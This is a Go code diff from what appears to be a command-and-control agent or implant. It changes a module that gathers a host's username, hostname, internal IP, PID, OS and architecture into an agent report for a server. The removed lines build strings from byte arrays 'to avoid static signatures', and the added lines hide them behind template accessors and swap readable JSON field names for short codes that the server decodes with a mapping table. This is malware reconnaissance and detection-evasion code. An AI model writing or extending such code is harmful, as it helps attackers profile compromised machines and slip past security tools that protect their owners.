@@ -17,32 +17,30 @@ import (
 	"time"
 )
 
-// System info strings (constructed to avoid static signatures)
-var (
-	siKeyStartupTime = string([]byte{0x73, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x5f, 0x74, 0x69, 0x6d, 0x65}) // startup_time
-	siStatusActive   = string([]byte{0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                                     // active
-)
+// System info template accessors - uses ExecReqTemplate
+func siKeyStartupTime() string { return erTpl(idxExecReqSysInfoStartupTime) }
+func siStatusActive() string   { return erTpl(idxExecReqSysInfoStatusActive) }
 
 // SystemInfo represents the collected system information
 type SystemInfo struct {
 	// Basic process info
 	PID      int    `json:"pid"`
-	ProcName string `json:"process_name"`
+	ProcName string `json:"pn"`
 
 	// System identification
-	Username string `json:"username"`
-	Hostname string `json:"hostname"`
+	Username string `json:"un"`
+	Hostname string `json:"hn"`
 
 	// Network info
-	IP string `json:"internal_ip"`
+	IP string `json:"ip"`
 
 	// System details
-	Architecture string    `json:"architecture"`
+	Architecture string    `json:"ac"`
 	OS           string    `json:"os"`
-	Timestamp    time.Time `json:"timestamp"`
+	Timestamp    time.Time `json:"ts"`
 
 	// Client identification
-	ClientID string `json:"client_id"`
+	ClientID string `json:"cl"`
 
 	// Random seed
 	Seed string `json:"seed"`
@@ -50,9 +48,9 @@ type SystemInfo struct {
 
 // SystemInfoReport represents the complete report structure
 type SystemInfoReport struct {
-	AgentInfo SystemInfo        `json:"agent_info"`
-	Metadata  map[string]string `json:"metadata"`
-	Status    string            `json:"status"`
+	AgentInfo SystemInfo        `json:"ag"`
+	Metadata  map[string]string `json:"md"`
+	Status    string            `json:"st"`
 	Error     string            `json:"error,omitempty"`
 }
 
@@ -213,13 +211,22 @@ func CollectSystemInfo(clientID string) (*SystemInfoReport, error) {
 	// Get architecture
 	info.Architecture = getArchitecture()
 
-	// Create the full report
+	// Create the full report with metadata including JSON field mapping
+	metadata := map[string]string{
+		siKeyStartupTime(): time.Now().UTC().Format(time.RFC3339),
+	}
+
+	// Add JSON field mapping to metadata so server can decode responses
+	// The mapping is serialized as JSON within the metadata
+	fieldMapping := GetJSONFieldMapping()
+	if fieldMappingJSON, err := json.Marshal(fieldMapping); err == nil {
+		metadata["jfm"] = string(fieldMappingJSON)
+	}
+
 	report := &SystemInfoReport{
 		AgentInfo: *info,
-		Metadata: map[string]string{
-			siKeyStartupTime: time.Now().UTC().Format(time.RFC3339),
-		},
-		Status: siStatusActive,
+		Metadata:  metadata,
+		Status:    siStatusActive(),
 	}
 
 	return report, nil
